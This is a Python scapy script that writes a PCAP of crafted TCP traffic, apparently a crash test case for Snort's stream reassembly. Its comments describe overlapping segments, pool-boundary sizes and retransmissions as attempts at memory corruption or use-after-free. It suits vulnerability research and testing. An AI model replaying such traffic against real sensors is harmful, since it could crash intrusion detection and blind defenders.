#!/usr/bin/env python3
from scapy.all import *
import random

# Set up the IP addresses and ports
src_ip = "192.168.1.100"
dst_ip = "192.168.1.200"
src_port = 12345
dst_port = 80

# Initial sequence numbers
client_isn = random.randint(1000000000, 2000000000)
server_isn = random.randint(1000000000, 2000000000)

# Create the packets
packets = []

# TCP 3-way handshake
# SYN
syn = IP(src=src_ip, dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags="S", seq=client_isn)
packets.append(syn)

# SYN-ACK
syn_ack = IP(src=dst_ip, dst=src_ip)/TCP(sport=dst_port, dport=src_port, flags="SA", 
             seq=server_isn, ack=client_isn+1)
packets.append(syn_ack)

# ACK
ack = IP(src=src_ip, dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags="A", 
         seq=client_isn+1, ack=server_isn+1)
packets.append(ack)

# Now we'll create potentially problematic packets

# 1. Create segment pool to fill the reserve pool (around res_min and res_max values)
# The code uses res_min=1024 and res_max=1460
base_seq = client_isn + 1
current_seq = base_seq
# Generate segments with sizes that will be cached in the reserved pool
for i in range(20):
    # Create payload near the res_max boundary (1460)
    payload_size = random.randint(1450, 1460)
    payload = b"A" * payload_size
    
    # Send the segment
    pkt = IP(src=src_ip, dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags="PA", 
             seq=current_seq, ack=server_isn+1)/Raw(load=payload)
    packets.append(pkt)
    
    # Acknowledgment from server
    ack = IP(src=dst_ip, dst=src_ip)/TCP(sport=dst_port, dport=src_port, flags="A", 
             seq=server_isn+1, ack=current_seq+payload_size)
    packets.append(ack)
    
    current_seq += payload_size

# 2. Create overlapping segments to confuse TCP reassembly
overlap_start = base_seq + 100
for i in range(15):
    # Create overlapping segments with small variations
    payload1 = b"B" * 200
    payload2 = b"C" * 200
    
    # First segment
    pkt1 = IP(src=src_ip, dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags="PA", 
              seq=overlap_start + i*10, ack=server_isn+1)/Raw(load=payload1)
    packets.append(pkt1)
    
    # Overlapping segment (partial overlap)
    pkt2 = IP(src=src_ip, dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags="PA", 
              seq=overlap_start + i*10 + 100, ack=server_isn+1)/Raw(load=payload2)
    packets.append(pkt2)

# 3. Exploit potential memory corruption by sending segments that will be reassembled
# Create segments at boundary conditions
for i in range(10):
    # Attack attempt 1: Target potential use-after-free
    # Send segment that will free up a segment from reserved pool
    payload_size = 1200  # Between res_min (1024) and res_max (1460)
    payload = b"X" * payload_size
    
    seq_num = current_seq + i*payload_size
    pkt = IP(src=src_ip, dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags="PA", 
             seq=seq_num, ack=server_isn+1)/Raw(load=payload)
    packets.append(pkt)
    
    # Immediately try to reuse that segment with a crafted retransmission
    retrans_payload = b"Z" * (payload_size - 1) + b"\x00"  # Slightly modified to avoid full match
    retrans_pkt = IP(src=src_ip, dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags="PA", 
                  seq=seq_num, ack=server_isn+1)/Raw(load=retrans_payload)
    packets.append(retrans_pkt)

# 4. Force out-of-order packets with complex sequence
# This attempts to create a condition where segments aren't handled properly
base = current_seq + 5000
segments = []
for i in range(20):
    size = random.randint(100, 500)
    segments.append((base + i*600, size))

# Randomize the order to create a complex reassembly scenario
random.shuffle(segments)
for seq, size in segments:
    payload = b"O" * size
    pkt = IP(src=src_ip, dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags="PA", 
             seq=seq, ack=server_isn+1)/Raw(load=payload)
    packets.append(pkt)

# 5. Add FIN packets to close the connection
fin = IP(src=src_ip, dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags="FA", 
         seq=current_seq+10000, ack=server_isn+1)
packets.append(fin)

fin_ack = IP(src=dst_ip, dst=src_ip)/TCP(sport=dst_port, dport=src_port, flags="FA", 
             seq=server_isn+1, ack=current_seq+10001)
packets.append(fin_ack)

last_ack = IP(src=src_ip, dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags="A", 
              seq=current_seq+10001, ack=server_isn+2)
packets.append(last_ack)

# Write the packets to a PCAP file
wrpcap("snort_tcp_stream_crash.pcap", packets)
print(f"Created PCAP with {len(packets)} packets")
